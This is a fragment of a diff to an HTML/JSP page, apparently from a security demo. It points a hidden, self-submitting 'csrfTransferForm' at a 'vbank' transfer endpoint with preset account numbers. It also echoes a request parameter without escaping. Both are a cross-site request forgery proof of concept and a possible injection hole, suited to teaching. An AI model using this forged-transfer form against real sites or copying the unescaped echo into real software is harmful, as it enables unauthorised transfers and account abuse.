@@ -7,7 +7,7 @@
 </head>
 <body>
     <h2 class="hello-title">Hello ${param.name}!</h2>
-    <form action="http://localhost:8080/doTransfer" method="post" target="hiddenFrame"
+    <form action="http://vbank.0.0.0.0.xip.io:8080/doTransfer" method="post" target="hiddenFrame"
           id="csrfTransferForm">
         <input name="fromAccount" type="hidden" value="1-987654-1">
         <input name="toAccount" type="hidden" value="2-542397-2">
